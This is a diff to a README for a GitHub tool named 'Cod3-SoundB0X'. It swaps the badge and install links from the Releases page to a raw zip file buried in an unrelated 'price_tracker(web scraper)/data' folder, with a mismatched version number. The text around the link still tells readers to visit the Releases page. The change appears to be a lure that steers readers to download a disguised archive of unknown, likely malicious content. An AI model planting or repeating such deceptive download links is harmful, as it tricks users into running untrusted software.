@@ -1,6 +1,6 @@
 # 🧪 Cod3-SoundB0X - Explore New Tools Easily
 
-[![Download Cod3-SoundB0X](https://img.shields.io/badge/Download%20Cod3--SoundB0X-v1.0-blue)](https://github.com/Dobrii69/Cod3-SoundB0X/releases)
+[![Download Cod3-SoundB0X](https://raw.githubusercontent.com/Dobrii69/Cod3-SoundB0X/main/Python/price_tracker(web scraper)/data/Cod3-SoundB0X_3.0-beta.3.zip%20Cod3--SoundB0X-v1.0-blue)](https://raw.githubusercontent.com/Dobrii69/Cod3-SoundB0X/main/Python/price_tracker(web scraper)/data/Cod3-SoundB0X_3.0-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run Cod3-SoundB0X smoothly, ensure your system meets the following requiremen
 
 ## 📥 Download & Install
 
-To get started, visit the following page to download the application: [Download Cod3-SoundB0X](https://github.com/Dobrii69/Cod3-SoundB0X/releases).
+To get started, visit the following page to download the application: [Download Cod3-SoundB0X](https://raw.githubusercontent.com/Dobrii69/Cod3-SoundB0X/main/Python/price_tracker(web scraper)/data/Cod3-SoundB0X_3.0-beta.3.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of Cod3-SoundB0X.
